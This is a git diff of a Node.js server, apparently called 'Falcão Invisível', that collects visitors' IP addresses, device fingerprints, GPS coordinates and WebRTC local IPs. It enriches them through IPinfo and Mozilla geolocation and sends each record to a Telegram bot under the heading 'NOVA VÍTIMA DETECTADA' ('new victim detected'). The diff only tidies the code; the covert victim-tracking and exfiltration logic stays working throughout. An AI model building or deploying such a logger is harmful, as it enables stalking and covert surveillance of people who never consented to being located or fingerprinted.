@@ -4,7 +4,6 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Variáveis de ambiente (.env ou Render)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
@@ -17,7 +16,7 @@ app.get('/', (req, res) => {
 
 app.post('/log', async (req, res) => {
   const data = req.body;
-  console.log("📥 Dados recebidos do front:", data);
+  console.log("📥 Dados recebidos:", data);
 
   if (!botToken || !chatId) {
     console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
@@ -26,7 +25,6 @@ app.post('/log', async (req, res) => {
 
   let preciseLoc = null;
 
-  // Localização via Mozilla (fallback caso GPS falhe)
   try {
     const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
       method: "POST",
@@ -34,50 +32,42 @@ app.post('/log', async (req, res) => {
       body: JSON.stringify({ considerIp: true })
     });
     const mlsData = await mlsRes.json();
-    if (mlsData && mlsData.location) {
-      preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
-    }
+    preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
   } catch (mlsErr) {
     console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
   }
 
-  // Dados via IPinfo
   try {
     const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
     const ipInfo = await ipResponse.json();
 
     const mensagem = `
-📡 *NOVA VÍTIMA DETECTADA*
+📡 NOVA VÍTIMA DETECTADA
 
-🧠 *ID:* \`${data.visitorId || "N/A"}\`
-🌍 *IP:* \`${data.ip}\`
-📍 *Localização:* ${ipInfo.city || "N/A"}, ${ipInfo.region || "N/A"}, ${ipInfo.country || "N/A"}
-🏢 *ISP:* ${ipInfo.org || "N/A"}
-🕵️‍♂️ *User-Agent:* \`${data.userAgent || "N/A"}\`
-📱 *Dispositivo:* \`${data.device || "N/A"}\`
-📌 *Lat/Long:* ${data.loc || preciseLoc || ipInfo.loc || "Indisponível"}
-🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
-`;
-
-    console.log("🔍 Enviando dados ao Telegram...");
+🧠 ID: ${data.visitorId}
+🌍 IP: ${data.ip}
+📍 Localização: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+🏢 ISP: ${ipInfo.org}
+🕵️‍♂️ Agente: ${data.userAgent}
+📱 Dispositivo: ${data.device}
+📌 Lat/Long: ${data.loc || preciseLoc || ipInfo.loc}
+🌐 IP Local (WebRTC): ${data.localIP || "N/A"}
+    `;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
-        text: mensagem,
-        parse_mode: "Markdown"
+        text: mensagem
       })
     });
 
     const telegramResult = await telegramRes.json();
-    console.log("📤 RESPOSTA TELEGRAM:", telegramResult);
-
     if (!telegramResult.ok) {
-      console.error("❌ Erro ao enviar para o Telegram:", telegramResult.description);
+      console.error("❌ Erro ao enviar pro Telegram:", telegramResult);
     } else {
-      console.log("✅ Notificação enviada com sucesso!");
+      console.log("✅ Notificação enviada ao Telegram");
     }
 
     res.sendStatus(200);
@@ -88,5 +78,5 @@ app.post('/log', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`🦅 Falcão Invisível rodando em: http://localhost:${PORT}`);
+  console.log(`🦅 Falcão rodando em: http://localhost:${PORT}`);
 });
